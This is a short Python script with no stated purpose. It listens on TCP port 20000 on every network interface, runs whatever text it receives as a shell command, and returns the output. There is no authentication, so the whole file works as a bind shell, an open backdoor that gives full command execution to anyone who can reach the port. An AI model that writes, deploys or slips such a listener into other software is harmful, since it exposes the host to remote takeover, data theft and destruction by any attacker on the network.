#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import socketserver
import os
class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        command = self.request.recv(1024).strip().decode('UTF-8').strip()
        self.request.sendall(bytes(os.popen(command).read(), 'UTF-8'))

server = socketserver.TCPServer(('', 20000), MyTCPHandler)
server.serve_forever()
